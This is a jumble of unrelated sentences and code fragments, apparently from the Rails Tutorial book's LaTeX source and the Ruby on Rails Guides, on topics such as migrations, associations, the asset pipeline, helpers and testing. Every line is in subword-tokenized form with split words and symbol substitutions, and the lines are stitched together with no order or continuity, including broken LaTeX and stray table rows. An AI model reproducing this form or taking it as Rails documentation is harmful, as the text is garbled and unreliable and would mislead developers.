▁Use d ▁internally ▁by ▁stylesheet _ link _ tag ▁to ▁build ▁the ▁stylesheet ▁path .
▁NOTE : ▁This ▁method ▁is ▁alias ed ▁as ▁` collection ▖ concat ` ▁and ▁` collection ▖ push ` .
▁This ▁test ▁verifie s ▁that ▁calling ▁\ k ode { Micropost ▖ new } ▁with ▁a ▁nonempty ▁\ k ode { user \_ id } ▁raise s ▁a ▁ mass ▁assignment ▁security ▁error ▁exception .
▁After ▁reset ting ▁the ▁database , ▁on ▁some ▁systems ▁the ▁test ▁database ▁needs ▁to ▁be ▁re - prepare d ▁as ▁well :
▁In ▁this ▁section , ▁we ' ll ▁take ▁a ▁first ▁step ▁toward ▁making ▁dynamic ▁pages ▁by ▁creating ▁a ▁set ▁of ▁Rails ▁\ emph { action s } ▁and ▁\ emph { views } ▁containing ▁( for ▁now ) ▁only ▁static ▁HTML
▁We ▁some what ▁arbitrar ily ▁arrange ▁for ▁the ▁first ▁user ▁to ▁follow ▁users ~ 3 ▁through ▁ 51 , ▁and ▁then ▁have ▁users ▁4 ▁through ▁4 1 ▁follow ▁that ▁user ▁back .
▁You ▁can ▁also ╼ le a ve ▁another ▁comment ▁on ▁the ▁pull ▁request .
▁### ▁Defin ing ▁Defaults
▁My ▁Rails ▁Tutorial ▁sample ▁application , ▁for ▁instance , ▁live s ▁in
▁U p on ▁ submitting ▁the ▁form ▁in ▁Figure ~\ ref { fig : forgot _ password _ form }, ▁we ▁need ▁to ▁find ▁the ▁user ▁by ▁email ▁address ▁and ▁update ▁its ▁attributes ▁with ▁the ▁password ▁reset ▁token ▁and ▁sent - at ▁timestamp .
▁* ▁` collection ▖ clear `
▁This ▁means ▁either ▁that ▁( a ) ▁I ' m ▁g ross ly ▁in com pe t ent ▁or ▁( b ) ▁you ▁can ▁be ▁a ▁ s kill ed ▁Rails ▁developer ▁without ▁know ing ▁all ▁its ▁in n ar d s .
▁To ▁apply ▁` L I MIT ` ▁to ▁the ▁SQL ▁fire d ▁by ▁the ▁` Model ▖ find `, ▁you ▁can ▁specify ▁the ▁` L I MIT ` ▁using ▁` limit ` ▁and ▁` offset ` ▁methods ▁on ▁the ▁relation .
▁By ▁the ▁way , ▁for ▁a ▁change ▁as ▁small ▁as ▁this ▁one ▁I ▁would n ' t ▁normal ly ▁both er ▁with ▁a ▁new ▁branch , ▁but ▁in ▁the ▁present ▁context ▁it ' s ▁a ▁p ri me ▁opportunit y ▁to ▁start ▁p ra c tic ing ▁good ▁ha bit s .
▁The ▁application ▁code , ▁which ▁introduce s ▁the ▁\ k ode { redirect \_ to } ▁method , ▁appears ▁in ▁Listing ~\ ref { code : user _ create _ action } .
▁| ▁| ▁42 4 ▁| ▁: failed _ dependency ▁|
▁C a ref ul ly ▁ inspect ing ▁the ▁debug ▁information ▁in ▁Figure ~\ ref { fig : initial _ failed _ login _ rails _3} ▁shows ▁that , ▁as ▁hint ed ▁at ▁the ▁end ▁of ▁Section ~\ ref { sec : login _ form }, ▁the ▁submission ▁results ▁in ▁a ▁\ k ode { params } ▁hash ▁containing ▁the ▁email ▁and ▁password ▁under ▁the ▁key ▁\ k ode { session }, ▁which ▁( o m it ting ▁some ▁irrelevant ▁details ▁used ▁internally ▁by ▁Rails ) ▁appears ▁as ▁follows :
▁which ▁in ▁the ▁case ▁of ▁Listing ~\ ref { code : persistent _ sessions _ test } ▁gives
▁This ▁pattern ▁is ▁the ▁can on ical ▁way ▁to ▁make ▁a ▁micropost : ▁\ emph { through } ▁its ▁association ▁with ▁a ▁user .
▁rake (" db : migrate ")
▁This ▁happens ▁because ▁c ▁and ▁ o ▖ customer ▁are ▁two ▁different ▁in - memory ▁representation s ▁of ▁the ▁same ▁data , ▁and ▁ n either ▁one ▁is ▁automatically ▁refresh ed ▁from ▁changes ▁to ▁the ▁other ▖
▁Date ▖ new (201 0, ▁ 12 , ▁ 23 )▖ change ( year : ▁2011 , ▁ month : ▁ 11 )
▁After ▁this ▁point , ▁all ▁ ra i lt i e ▁and ▁engine ▁ initializers ▁are ▁run .
▁In ▁the ▁case ▁of ▁the ▁User ▁model , ▁the ▁migration ▁is ▁created ▁automatically ▁by ▁the ▁model ▁generation ▁ script ; ▁it ▁creates ▁a ▁\ k ode { users } ▁table ▁with ▁two ▁columns , ▁\ k ode { name } ▁and ▁\ k ode { email }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : users _ migration } .
▁ Meanwhile , ▁the ▁\ k ode { nav }, ▁\ line break ▁\ k ode { navbar - nav }, ▁and ▁\ k ode { navbar - right } ▁classes ▁on ▁the ▁\ k ode { ul } ▁tag ▁have ▁special ▁meaning ▁to ▁Bootstrap ▁and ▁will ▁be ▁style d ▁automatically ▁when ▁we ▁include ▁the ▁Bootstrap ▁CSS ▁in ▁Section ~\ ref { sec : custom _ css } .
▁By ▁default , ▁methods ▁defined ▁in ▁any ▁helper ▁file ▁are ▁automatically ▁available ▁in ▁any ▁view , ▁but ▁for ▁convenience ▁we ' ll ▁put ▁the ▁\ k ode { gravatar \_ for } ▁method ▁in ▁the ▁file ▁for ▁helpers ▁ associated ▁with ▁the ▁Users ▁controller .
▁Get ▁the ▁root ▁path ▁( Home ▁page )
▁after _ bundle ▁do
▁` ActiveRecord ` ▁is ▁a ▁Ruby ▁module , ▁whereas ▁Active ▁Record ▁is ▁an ▁ ORM ▖
▁ { a : ▁1 } ▖ assert _ valid _ keys (: a ) ▁# ▁passes
▁This ▁guide ▁cover s ▁different ▁ways ▁to ▁retrieve ▁data ▁from ▁the ▁database ▁using ▁Active ▁Record .
▁### ▁CSRF ▁ protection ▁from ▁remote ▁`< script >` ▁tags
▁> > ▁1▖ year ▖ from _ now
▁( We ▁could ▁have ▁switch ed ▁from ▁\ k ode { user } ▁to ▁\ k ode { self }, ▁but ▁recall ▁from ▁Section ~\ ref { sec : uniqueness _ validation } ▁that ▁\ k ode { self } ▁is ▁optional ▁inside ▁the ▁model ▖)
▁Even ▁better , ▁we ▁can ▁configure ▁Guard ▁so ▁that ▁when , ▁say , ▁the ▁\ k ode { home ▖ html ▖ erb } ▁file ▁is ▁ modified , ▁the ▁\ k ode { static \_ pages \_ spec ▖ rb } ▁automatically ▁run s .
▁# ▁=> ▁{" " ▁=> ▁nil , ▁" a " ▁=> ▁: a , ▁ "1" ▁=> ▁1 }
▁config ▖ assets ▖ css _ compressor ▁= ▁: yui
▁not h ing ▁to ▁commit ▁( working ▁directory ▁clean )
▁In ▁fact , ▁inside ▁the ▁ String ▁class ▁the ▁use ▁of ▁\ k ode { self ▖ } \ ▁is ▁optional ▁on ▁a ▁method ▁or ▁attribute ▁( unless ▁we ' re ▁making ▁an ▁assignment ), ▁so
▁S ince ▁a ▁word ▁\ emph { is ▁a } ▁string , ▁it ' s ▁more ▁natural ▁to ▁have ▁our ▁\ k ode { Word } ▁class ▁\ emph { in her it } ▁from ▁\ k ode { String }, ▁as ▁seen ▁in ▁Listing ~\ ref { code : word _ class } .
▁To ▁see ▁the ▁results ▁of ▁the ▁templates ▁defined ▁in ▁Listing ~\ ref { code : account _ activation _ view _ text } ▁and ▁Listing ~\ ref { code : account _ activation _ view _ html }, ▁we ▁can ▁use ▁\ emph { email ▁ preview s }, ▁which ▁are ▁special ▁URLs ▁expose d ▁by ▁Rails ▁to ▁let ▁us ▁see ▁what ▁our ▁email ▁messages ▁look ▁like .
▁We ' ll ▁cover ▁it ▁moment ar ily ▖)
▁Active ▁Support ▁for ▁example ▁uses ▁this ▁method ▁in ▁` Module # qualified _ const _ set `:
▁( We ' ll ▁learn ▁more ▁about ▁database ▁migrations ▁starting ▁in ▁Section ~\ ref { sec : database _ migrations } ▖)
▁This ▁section ▁will ▁provide ▁a ▁step - by - step ▁guide ▁to ▁creating ▁a ▁job ▁and ▁ en q ue u ing ▁it .
▁We ▁start ▁with ▁a ▁request ▁issue d ▁from ▁the ▁browser --- i ▖ e ▖ , ▁the ▁result ▁of ▁typing ▁a ▁URL ▁in ▁the ▁address ▁bar ▁or ▁click ing ▁on ▁a ▁link ▁( Step ~ 1 ▁in ▁Figure ~\ ref { fig : mvc _ detailed }) .
▁In side ▁the ▁\ k ode { header } ▁tag , ▁we ▁see ▁a ▁\ k ode { div } ▁tag :
▁id : ▁[1, 2, 3 ])
▁This ▁means ▁you ' re ▁not ▁required ▁to ▁provide ▁local ize d ▁views ▁for ▁all ▁cases , ▁but ▁they ▁will ▁be ▁preferred ▁and ▁used ▁if ▁available .
▁In ▁case ▁you ' re ▁curious , ▁you ▁can ▁view ▁the ▁environment ▁variables ▁used ▁in ▁Listing ~\ ref { code : sendgrid _ config } ▁as ▁follows :
▁When ▁you ▁submit ▁the ▁form , ▁you ▁should ▁see ▁a ╼ familiar ▁error :
▁The ▁two ▁ service s ▁share ▁many ▁similar it ies : ▁both ▁site s ▁allow ▁for ▁Git ▁repository ▁host ing ▁and ▁collaborat ion , ▁as ▁well ▁as ▁offer ing ▁convenient ▁ways ▁to ▁b row se ▁and ▁search ▁repositories .
▁### ▁` belongs _ to ` ▁Association ▁Reference
▁number _ to _ phone ( 1235551234 ) ▁# ▁=> ▁ 123 - 555-1234
▁An ▁example ▁of ▁flash ▁ persistence .
▁| ▁key ▁| ▁key _ le n ▁| ▁ ref ▁| ▁rows ▁| ▁ Extra ▁|
▁| ▁| ▁5 10 ▁| ▁: not _ ext end ed ▁|
▁The ▁`: counter _ cache ` ▁option ▁can ▁be ▁used ▁to ▁make ▁find ing ▁the ▁number ▁of ▁ belonging ▁objects ▁more ▁ efficient ▖
▁The ▁un for t un ate ▁ hybrid ▁usage ▁in ▁the ▁`` following '' ▁route ▁is ▁ force d ▁by ▁our ▁choice ▁to ▁use ▁the ▁un a mb ig u ous ▁`` followed ▁users '' ▁terminology ▁along ▁with ▁the ▁`` following '' ▁usage ▁from ▁Twitter .
▁" "▖ duplicable ?
▁Spork ▁load s ▁the ▁environment ▁\ emph { once }, ▁and ▁then ▁maintain s ▁a ▁ po ol ▁of ▁process es ▁for ▁running ▁future ▁tests .
▁S w it ch ▁over ▁to ▁the ▁ target ▁branch ▁and ▁apply ▁your ▁changes :
▁# ▁config ▖ assets ▖ precompile ▁ += ▁% w ( ▁search ▖ js ▁ )
▁The ▁generated ▁form ▁HTML ▁appears ▁in ▁Listing ~\ ref { code : login _ form _ html } .
▁Noti ce ▁the ▁format ▖ js ▁in ▁the ▁` respond _ to ` ▁block ; ▁that ▁allows ▁the ▁controller ▁to ╼ respond ▁to ▁your ▁Ajax ▁request ▖
▁If ▁you ▁are ▁sure ▁about ▁what ▁you ▁are ▁doing ▁and ▁would ▁like ▁to ▁have ▁a ▁more ▁clear ▁output , ▁there ' s ▁a ▁way ▁to ▁override ▁the ▁flag :
▁### ▁Get ▁some ▁F e ed back
▁We ' ll ▁see ▁how ▁to ▁do ▁this ▁at ▁the ▁end ▁of ▁the ▁section .
▁And ▁you ' ll ▁be ▁able ▁to ▁switch ▁between ▁them ▁without ▁ having ▁to ▁re write ▁your ▁job s .
▁When ▁this ▁option ▁is ▁true , ▁the ▁asset ▁pipeline ▁will ▁check ▁if ▁all ▁the ▁assets ▁loaded ╼ in ▁your ▁application ▁are ▁included ▁in ▁the ▁` config ▖ assets ▖ precompile ` ▁list ▖╼
▁With ▁this ▁route , ▁Rails ▁will ▁match ▁an ▁in com ing ▁path ▁of ▁` / photos / 12 ` ▁to ▁the ▁` show ` ▁action ▁of ▁` PhotosController ` .
▁number _ with _ precision ( 111▖2345 ) ▁# ▁=> ▁111▖23 5
▁# ▁Configur e ▁static ▁asset ▁server ▁for ▁tests ▁with ▁ Cache - Control ▁for ▁perform ance
▁* ▁` joins `
▁$ ▁rails ▁console
▁Because ▁every ▁micropost ▁should ▁have ▁a ▁user ▁id , ▁we ' ll ▁add ▁a ▁test ▁for ▁a ▁\ k ode { user \_ id } ▁presence ▁validation .
▁One ▁of ▁the ▁most ▁not able ▁addition s ▁in ▁ recent ▁versions ▁of ▁Rails ▁is ▁the ▁asset ▁pipeline , ▁which ▁significant ly ▁improve s ▁the ▁production ▁and ▁manage ment ▁of ▁static ▁assets ▁such ▁as ▁CSS , ▁JavaScript , ▁and ▁images .
▁It s ▁effect ▁is ▁to ▁set ▁the ▁\ k ode {@ current \_ user } ▁instance ▁variable ▁to ▁the ▁user ▁corresponding ▁to ▁the ▁remember ▁token , ▁but ▁only ▁if ▁\ k ode {@ current \_ user } ▁is ▁undefined
▁has _ many ▁: line _ items
▁Signup ▁ success ▁creates ▁a ▁user ▁in ▁the ▁database ▁and ▁redirect s ▁to ▁the ▁user ▁show ▁page , ▁and ▁display s ▁a ▁ welcome ▁message .
▁As ▁\ href { http :// en ▖ gravatar ▖ com / site / implement / hash /}{ not ed ▁at ▁the ▁Gravatar ▁ home ▁page }, ▁Gravatar ▁URLs ▁are ▁base d ▁on ▁an ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / M D 5 } { M D 5 ▁hash } ▁of ▁the ▁user ' s ▁email ▁address .
▁This ▁is ▁me re ly ▁a ▁convention , ▁and ▁in ▁fact ▁using ▁ s na k e ▁case ▁at ▁the ▁command ▁line ▁also ▁works : ▁the ▁command
▁# ▖ ▖ .
▁d ▖ advance ( months : ▁1, ▁second s : ▁1)
▁A ▁ generalized ▁\ k ode { authenticated ?}
▁=> ▁#< Blorgh :: Article ▁id : ▁1 ▁ ▖ ▖ .
▁The ▁valid ▁format s ▁consist ▁of ▁the ▁\ href { https :// en ▖ w ikipedia ▖ org / wiki / Internet _ media _ type } { MIME ▁types } ▁accepted ▁by ▁the ▁validation ▁in ▁Listing ~\ ref { code : micropost _ model _ image _ validation } .
▁@ user ▁= ▁user
▁As ▁indicate d ▁in ▁Figure ~\ ref { fig : valid _ submission _ error }, ▁this ▁is ▁because ▁the ▁default ▁behavior ▁for ▁a ▁Rails ▁action ▁is ▁to ▁render ▁the ▁corresponding ▁view , ▁and ▁there ▁isn ' t ▁a ▁view ▁template ▁corresponding ▁to ▁the ▁\ k ode { create } ▁action .
▁Fin ally , ▁Rails ▁benefit s ▁from ▁an ▁un us u ally ▁ en th us ia s tic ▁and ▁d ivers e ▁ community .
▁Pipeline ▁assets ▁can ▁be ▁placed ▁inside ▁an ▁application ▁in ▁one ▁of ▁three ▁location s : ╼` app / assets `, ▁` lib / assets ` ▁or ▁` vendor / assets ` .
▁as ▁show n ▁in ▁Listing ~\ ref { code : test _ domain _ host } .
▁P lease ▁refer ▁to ▁the ▁documentation ▁of ▁` Date ▖ _ parse ` ▁for ▁further ▁details .
▁We ' ll ▁start ▁by ▁learning ▁how ▁to ▁model ▁relationships ▁between ▁users ▁in ▁Section ~\ ref { sec : the _ relationship _ model }, ▁and ▁we ' ll ▁build ▁the ▁corresponding ▁web ▁interface ▁in ▁Section ~\ ref { sec : a _ web _ interface _ for _ following _ and _ followers } ▁( including ▁an ▁introduction ▁to ▁Ajax ) .
▁Check ing ▁for ▁this ▁requires ▁the ▁use ▁of ▁the ▁`` not '' ▁operator ▁( Section ~\ ref { sec : objects _ and _ message _ passing }), ▁written ▁using ▁an ▁excl a m ation ▁point ~\ k ode { !} \ ▁and ▁usually ▁read ▁as ▁`` bang '' .
▁=> ▁" foobar "
▁For ▁example , ▁you ▁can ' t ▁just ▁ interpolate ▁`@ re view ▖ title ` ▁verb at im ▁into ▁an ▁HTML ▁page ▖
▁This ▁means ▁` Date ▖ today ` ▁may ▁equal ▁` Date ▖ yesterday ` .
▁In ▁this ▁section , ▁we ' ll ▁implement ▁a ▁security ▁model ▁that ▁requires ▁users ▁to ▁be ▁logged ▁in ▁and ▁prevent s ▁them ▁from ▁updating ▁any ▁information ▁other ▁than ▁their ▁own .
▁@ user ▁= ▁User ▖ find ( params [: id ])
▁create _ table ▁: account _ h ist or ies ▁do ▁| t |
▁master
▁It ' s ▁important ▁to ▁keep ▁in ▁mind ▁at ▁all ▁time s ▁that ▁the ▁application ▁should ╼ ** al way s ** ▁take ▁precedence ▁over ▁its ▁engines ▖
▁The ▁feed ▁item ▁partial ▁with ▁added ▁delete ▁link .
▁I ▁find ▁this ▁practice ▁to ▁be ▁un n ec ess ar ily ▁complicated , ▁while ▁also ▁in c ur r ing ▁an ▁extra ▁over head ▁if ▁there ▁are ▁common ▁setup ▁task s ▁needed ▁before ▁each ▁test .
▁Defaults ▁to ▁the ▁same ▁configured ▁at ▁` config ▖ logger ` ▖
▁WARNING : ▁Note ▁that ▁you ▁must ▁specify ▁the ▁extension ▁of ▁the ▁image .
▁# ▁< hash >
▁To ▁help ▁get ▁you ▁started , ▁I ▁can ▁give ▁two ▁pieces ▁of ▁general ▁a d v ice .
▁ Don ' t ▁worry ▁about ▁how ▁this ▁works ; ▁the ▁details ▁are ▁of ▁inter est ▁to ▁developers ▁of ▁the ▁Rails ▁framework ▁itself , ▁and ▁by ▁design ▁are ▁not ▁important ▁for ▁Rails ▁application ▁developers .
▁implie s ▁( via ▁the ▁RSpec ▁boolean ▁convention ) ▁that ▁the ▁user ▁should ▁have ▁an ▁\ k ode { admin ?}\ ▁boolean ▁method .
▁This ▁is ▁a ╼ po w er ful ▁technique ▁that ▁we ▁call ▁Ajax .
▁The ▁method ▁` truncate ` ▁returns ▁a ▁copy ▁of ▁its ▁receiver ▁ truncate d ▁after ▁a ▁given ▁` length `:
▁Let ' s ▁see ▁if ▁the ▁user ▁with ▁an ▁\ k ode { id } ▁of ~\ k ode {3} ▁ still ▁exists ▁in ▁the ▁database :
▁Now ▁that ▁we ' ve ▁updated ▁the ▁user ▁by ▁running ▁\ k ode { user ▖ save }, ▁the ▁magic ▁columns ▁differ , ▁as ▁pro mis ed ▁in ▁Section ~\ ref { sec : creating _ user _ objects } :
▁This ▁ puts ▁the ▁CSS ▁contain ed ▁within ▁the ╼ file ▁( if ▁any ) ▁at ▁the ▁precise ▁location ▁of ▁the ▁` require _ self ` ▁call .
▁If ▁the ▁other ▁class ▁contains ▁the ▁foreign ▁key , ▁then ▁you ▁should ▁use ▁` has _ one ` ▁instead .
▁ Callbacks ▁are ▁not ▁executed .
▁In ▁addition ▁to ▁\ k ode { length } ▁( se en ▁in ▁the ▁first ▁line ▁above ), ▁arrays ▁respond ▁to ▁a ▁we al th ▁of ▁other ▁methods :
▁def ▁set _ author
▁has _ many ▁: articles
▁3 ▖ ▖ 9 ) ▁# ▁=> ▁false
▁In ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ reset }, ▁we ' ll ▁make ▁\ emph { sure } ▁of ▁email ▁ validity ▁by ▁adding ▁a ▁separate ▁\ emph { account ▁activation } ▁step ▁to ▁user ▁signup .
▁Un less ▁you ▁specify ▁a ▁version ▁number ▁to ▁the ▁\ k ode { gem } ▁command , ▁Bundler ▁will ▁automatically ▁install ▁the ▁latest ▁request ed ▁version ▁of ▁the ▁gem .
▁As ▁with ▁the ▁line ▁to ▁include ▁the ▁application ▁stylesheet , ▁the ▁code ▁in ▁Listing ~\ ref { code : title _ helper } ▁may ▁look ▁simple ▁to ▁the ▁e y es ▁of ▁an ▁experience d ▁Rails ▁developer , ▁but ▁it ' s ▁\ emph { full } ▁of ▁important ▁Ruby ▁idea s : ▁module s , ▁method ▁definition , ▁optional ▁method ▁arguments , ▁comments , ▁local ▁variable ▁assignment , ▁boolean s , ▁control ▁ flow , ▁string ▁ concat en ation , ▁and ▁return ▁values .
▁NOTE : ▁You ▁only ▁need ▁to ▁provide ▁the ▁" host ", ▁this ▁is ▁the ▁ subdomain ▁and ▁root ╼ domain , ▁you ▁do ▁not ▁need ▁to ▁specify ▁a ▁protocol ▁or ▁" scheme " ▁such ▁as ▁` http :// ` ▁or ╼` https :// ` ▖
▁A lthough ▁the ▁pre c ed ing ▁code ▁would ▁work , ▁it ' s ▁not ▁ idiomatic ally ▁correct ▁Ruby ; ▁instead , ▁the ▁proper ▁way ▁to ▁write ▁the ▁assignment ▁to ▁\ k ode {@ current \_ user } ▁is ▁like ▁this :
▁Note ▁the ▁question ▁mark ▁at ▁the ▁end ▁of ▁the ▁\ k ode { empty ?}\ ▁method .
▁After ▁running ▁the ▁\ k ode { db : seed } ▁Rake ▁task , ▁our ▁application ▁has ▁100 ▁sample ▁users .
▁Recall ▁from ▁Section ~\ ref { sec : signup _ error _ messages } ▁that ▁we ▁displayed ▁signup ▁errors ▁using ▁the ▁User ▁model ▁error ▁messages .
▁In s er ting ▁data ▁into ▁HTML ▁templates ▁needs ▁extra ▁care ▖
▁if ▁boolean ?
▁# ▁do ▁something ▁after ▁perform
▁#### ▁check _ box _ tag
▁On ce ▁the ▁Heroku ▁deploy ▁has ▁ finished , ▁try ▁ signing ▁up ▁for ▁the ▁sample ▁application ▁in ▁production ▁using ▁an ▁email ▁address ▁you ▁control .
▁The ▁documentation ▁should ▁be ▁a ▁model ▁for ▁best ▁practice s ▁and ▁can on ical , ▁mode r n ▁Rails ▁usage .
▁Additional ly , ▁the ▁`-- mountable ` ▁option ▁tell s ▁the ▁generator ▁to ▁m o un t ▁the ▁engine ╼ in side ▁the ▁ dummy ▁testing ▁application ▁located ▁at ▁` test / dummy ` ▁by ▁adding ▁the ╼ following ▁to ▁the ▁ dummy ▁application ' s ▁routes ▁file ▁at ╼` test / dummy / config / routes ▖ rb `:
▁The ▁default ▁is
▁The ▁collection ▁of ▁join ▁models ▁can ▁be ▁manage d ▁via ▁the ▁API ▖ ▁For ▁example , ▁if ▁you ▁assign
▁This ▁means ▁that , ▁in ▁construct ing ▁the ▁new ▁session ▁form , ▁we ▁have ▁to ▁give ▁\ k ode { form \_ for } ▁slightly ▁more ▁information ; ▁in ▁particular , ▁whereas
▁ Migration s ▁change ▁the ▁state ▁of ▁the ▁database ▁using
▁A lthough ▁we ▁don ' t ▁yet ▁have ▁a ▁way ▁to ▁create ▁microposts ▁through ▁the ▁web --- that ▁comes ▁in ▁Section ~\ ref { sec : creating _ microposts } --- this ▁won ' t ▁stop ▁us ▁from ▁display ing ▁them ▁( and ▁testing ▁that ▁display ) .
▁SQL ▁is ▁case - insensitive , ▁but ▁it ▁is ▁convention al ▁to ▁write ▁SQL ▁keyword s ▁( such ▁as ▁\ k ode { D E S C }) ▁in ▁all - c a p s .
▁The ▁options ▁are ▁`: ruby ` ▁( the ▁default ) ▁for ▁a ▁database - in dependent ▁version ▁that ▁depend s ▁on ▁migrations , ▁or ▁`: sql ` ▁for ▁a ▁set ▁of ▁( potentially ▁database - dependent ) ▁SQL ▁statement s .
▁Buil t - in ▁rules ▁can ▁be ▁extend ed ▁in ▁` config / initializers / inflections ▖ rb ` ▖
▁name : ▁" David ")
▁Be low ╼ a re ▁a ▁few ▁examples ▁of ▁different ▁data ▁access ▁methods ▁provided ▁by ▁Active ▁Record .
▁ advance
▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ create _ image _ upload } .
▁as ▁show n ▁in ▁Listing ~\ ref { code : users _ controller _ test _ login _ route } .
▁The ▁console ▁allows ▁us ▁to ▁define ▁methods ▁the ▁same ▁way ▁we ▁did ▁with ▁the ▁\ k ode { home } ▁action ▁from ▁Listing ~\ ref { code : static _ pages _ controller } ▁or ▁the ▁\ k ode { full \_ title } ▁helper ▁from ▁Listing ~\ ref { code : title _ helper } .
▁Sass ▁and ▁the ▁asset ▁pipeline ▁allow ▁us ▁to ▁eliminate ▁duplication ▁in ▁our ▁CSS ▁while ▁pa c k a g ing ▁up ▁the ▁results ▁ efficient ly ▁for ▁production .
▁Whi le ▁Rails ▁uses ▁in te ll ig ent ▁defaults ▁that ▁will ▁work ▁well ▁in ▁most ▁situation s , ▁there ▁may ▁be ▁time s ▁when ▁you ▁want ▁to ▁customize ▁the ▁behavior ▁of ▁the ▁` has _ and _ belongs _ to _ many ` ▁association ▁reference ▖
▁An ▁emphasi s ▁on ▁HTTP ▁verb s ▁is ▁typical ▁of ▁web ▁framework s ▁( including ▁Rails ) ▁i nfluence d ▁by ▁the ▁\ emph { REST ▁architecture }, ▁which ▁we ▁saw ▁brief ly ▁in ▁Chapter ~\ ref { cha : a _ toy _ app } ▁and ▁will ▁start ▁learning ▁about ▁more ▁in ▁Chapter ~\ ref { cha : sign _ up } .
▁$ ▁git ▁ checkout ▁- b ▁testing _ branch
▁get ▁' / patients / : id ', ▁to : ▁' patients # show '
▁To ▁make ▁this ▁clear er , ▁let ' s ▁look ▁at ▁the ▁HTML ▁this ▁tag ▁produce s
▁An ▁In tr o duction ▁to ▁Ajax
▁For ▁instance ▁` ActionView :: Helpers :: Form Helper ` ▁defines :
▁client ▁= ▁Client ▖ last
▁The ▁About ▁page ▁at ▁\ href { http :// localhost :3000/ about }{/ about } ▖ ~\ href { http :// railstutorial ▖ org / images / figures / about _ page _ style d - full ▖ png }{( full ▁size )}
▁That ' s ▁config ur able ▁via ▁` Module ▖ attr _ internal _ na m ing _ format ` ▁though , ▁you ▁can ▁pass ▁any ▁` s print f ` - like ▁format ▁string ▁with ▁a ▁leading ▁`@ ` ▁and ▁a ▁` % s ` ▁some where , ▁which ▁is ▁where ▁the ▁name ▁will ▁be ▁placed ▖
▁That ▁does ▁not ▁even ▁put ▁the ▁entire ▁Active ▁Support ▁in ▁memory ▁up f r on t ▁in de ed , ▁some ▁ stuff ▁is ▁configured ▁via ▁` autoload `, ▁so ▁it ▁is ▁only ▁loaded ▁if ▁used .
▁( We ' ll ▁write ▁integration ▁tests ▁to ▁verify ▁this ▁behavior ▁in ▁Section ~\ ref { sec : following _ tests } ▖)
▁If ▁you ▁look ▁at ▁the ▁HTML ▁for ▁the ▁generated ▁form ▁by ▁ Ctrl - click ing ▁and ▁using ▁the ▁`` inspect ▁element '' ▁function ▁of ▁your ▁browser , ▁the ▁page ' s ▁source ▁should ▁look ▁something ▁like ▁Listing ~\ ref { code : signup _ form _ html } .
▁The ▁rest ▁of ▁this ▁chapter ▁is ▁d ed icated ▁to ▁making ▁this ▁page ▁ flow ▁actually ▁work .
▁<%= ▁form _ for ( [ @ article , ▁@ article ▖ comments ▖ build ]) ▁do ▁| f | ▁%>
▁Code ▁for ▁an ▁example ▁user .
▁The ▁` blog ` ▁directory ▁has ▁a ▁number ▁of ▁ auto - generated ▁files ▁and ▁folder s ▁that ▁make ╼ up ▁the ▁structure ▁of ▁a ▁Rails ▁application ▖
▁You ▁would n ' t ▁normal ly ▁do ▁this ▁in ▁a ▁real ▁application , ▁but ▁it ' s ▁easier ▁to ▁understand ▁the ▁purpose ▁of ▁the ▁layout ▁file ▁if ▁we ▁start ▁by ▁di s a b l ing ▁it .
▁You ▁can ▁think ▁of ▁a ▁ polymorphic ▁` belongs _ to ` ▁declaration ▁as ▁setting ▁up ▁an ▁interface ▁that ▁any ▁other ▁model ▁can ▁use ▖
▁Rails ▁supports ▁default ▁ ordering ▁via ▁\ k ode { default \_ scope } .
▁A ▁working ▁status ▁feed ▁on ▁the ▁live ▁Web .
▁as ▁seen ▁in ▁Listing ~\ ref { code : micropost _ user _ mis match _ test } .
▁There ▁are ▁sever al ▁reason s ▁why ▁you ▁m ight ▁want ▁to ▁ precompile ▁your ▁assets ▁local ly ▖╼
▁* = ▁require ▁ ch r o me
▁Section ~\ ref { sec : user _ micropost _ associations } ▁discuss es ▁the ▁effect s ▁of ▁this ▁line ▁in ▁more ▁ de p th ▖)
▁ Cache - Control : ╼ public , ▁ max - age = 25 92 000
▁d ▁- ▁3 ▖ hour s
▁The ▁` clear ` ▁method ▁is ▁used ▁when ▁you ▁intention ally ▁want ▁to ▁clear ▁all ▁the ▁messages ▁in ▁the ▁` errors ` ▁collection ▖
▁This ▁is ▁easy ▁using ▁the ▁named ▁route ▁\ k ode { edit \_ user \_ path } ▁from ▁Table ~\ ref { table : RESTful _ users }, ▁together ▁with ▁the ▁hand y ▁\ k ode { current \_ user } ▁helper ▁method ▁defined ▁in ▁Listing ~\ ref { code : current _ user _ working } :
▁TIP : ▁Change s ▁that ▁are ▁co s me tic ▁in ▁nature ▁and ▁do ▁not ▁add ▁anything ▁substan tial ▁to ▁the ▁ st ability , ▁functionality , ▁or ▁test ability ▁of ▁Rails ▁will ▁generally ▁not ▁be ▁accepted ▁( read ▁more ▁about ▁[ our ▁ r ation al es ▁ behind ▁this ▁ de ci s ion ]( https :// github ▖ com / rails / rails / pull /1 37 7 1 # issue comment - 3 27 4 67 00 ) ) .
▁config ▖ assets ▖ css _ compressor ▁= ▁ Trans form er ▖ new
▁( If ▁you ▁set ▁up ▁the ▁\ k ode { co } ▁alias ▁in ▁Section ~\ ref { sec : version _ control }, ▁you ▁can ▁use ▁\ k ode { git ▁co ▁- b ▁modify - README } ▁instead ▖)
▁A lthough ▁in ▁many ▁context s ▁we ▁can ▁effective ly ▁treat ▁\ k ode { following } ▁as ▁an ▁array , ▁Rails ▁is ▁ s m ar t ▁about ▁how ▁it ▁handle s ▁things ▁under ▁the ▁h ood .
▁If ▁there ▁are ▁no ▁errors ▁on ▁the ▁specified ▁attribute , ▁an ▁empty ▁array ╼ is ▁returned .
▁* ▁` set _ clear _ dependencies _ hook ` ▁Provide s ▁a ▁ hook ▁for ▁` active _ record ▖ set _ dispatch _ hook s ` ▁to ▁use , ▁which ▁will ▁run ▁before ▁this ▁initializer ▖
▁This ▁partial ▁will ▁be ▁responsib le ▁for ▁rendering ▁just ▁the ▁comment ▁text , ▁for ▁now ▖╼
▁te }╼╼ ▁% ▁subsection ▁a _ working _ log _ in _ method ▁( end )╼╼ ╼\ subsection { C ur r ent ▁user } ▁% ▁( fold )╼\ label { sec : current _ user }╼╼
▁<%= ▁image _ tag ▁ attachments [' image ▖ jpg '] ▖ url , ▁ alt : ▁' M y ▁P h o to ', ▁class : ▁' photos ' ▁%>
▁as ▁show n ▁in ▁Listing ~\ ref { code : proto _ status _ feed } .
